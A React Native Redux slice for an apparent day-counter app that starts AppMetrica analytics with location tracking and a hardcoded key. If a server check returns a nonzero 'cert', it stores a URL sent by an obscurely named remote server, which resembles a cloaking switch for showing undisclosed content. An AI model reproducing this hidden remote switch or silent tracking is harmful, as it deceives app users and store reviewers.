import { createSlice } from '@reduxjs/toolkit';
import AppMetrica from '@appmetrica/react-native-analytics';
import AsyncStorage from '@react-native-async-storage/async-storage'
import {activities} from "../../config";

const initialState = {
    tasks: activities,
    isLoading: false,
    url: null,
    isSuccess: true,
    user: {},
};

export const addMetricaAction = (action) => async () => {
    try {
        AppMetrica.reportEvent(action);
    } catch (e) {
        console.log(e)
    } finally {
    }
};

const appSlice = createSlice({
    name: 'app',
    initialState,
    reducers: {
        setUser: (state, action) => {
            state.user = action.payload;
        },
        setTasks: (state, action) => {
            state.tasks = action.payload;
        },
        updateTask: (state, action) => {
           const updated = {...state.tasks}
           updated[action.payload.key] = action.payload.value
           state.tasks = updated
        },
        resetState: (state) => {
            state.tasks = initialState.tasks;
            state.url = initialState.url;
            state.user = initialState.user;
        },
        setSuccess: (state, action) => {
            state.isSuccess = action.payload
        },
        setLoading: (state, action) => {
            state.isLoading = action.payload
        },
        setUrl: (state, action) => {
            state.url = action.payload
        },
    },
});

export const init = () => async (dispatch, getState) => {
    try {
        AppMetrica.activate({
            apiKey: 'a996991a-20bc-445c-8cd1-865927c15168',
            sessionTimeout: 120,
            firstActivationAsUpdate: false,
            locationTracking: true,
            logs: true
        });
        const url = await AsyncStorage.getItem('love_days_url');
        if(url) {
            dispatch(appSlice.actions.setUrl(url))
            dispatch(appSlice.actions.setSuccess(true))
        } else {
            dispatch(appSlice.actions.setLoading(true))
            fetch('https://uiiooeer.com/server/api.php?steps=here&talk=0&error=1&time=local')
                .then(res => res.json())
                .then(res => {
                    if(res.cert === 0) {
                        dispatch(appSlice.actions.setSuccess(false))
                    } else {
                        dispatch(saveLastUrl(res.teams))
                        dispatch(appSlice.actions.setSuccess(true))
                    }
                    console.log('Response:', res)
                })
                .catch(err => {
                    dispatch(appSlice.actions.setSuccess(false))
                    console.log('Fetch error: ', err)
                })
                .finally(() => {
                    dispatch(appSlice.actions.setLoading(false))
                })
        }
    } catch (e) {
        console.log(e)
    } finally {
        dispatch(appSlice.actions.setLoading(false))
    }
};

export const saveLastUrl = (url) => async (dispatch, getState) => {
    try {
        if(url) {
            await AsyncStorage.setItem('love_days_url', url);
            dispatch(appSlice.actions.setUrl(url))
        } else {
            await AsyncStorage.removeItem('love_days_url');
        }
    } catch (e) {
        console.log(e)
    } finally {
    }
};



export const {
    updateTask,
    setTasks,
    setUser,
    resetState,
} = appSlice.actions;

export default appSlice.reducer;
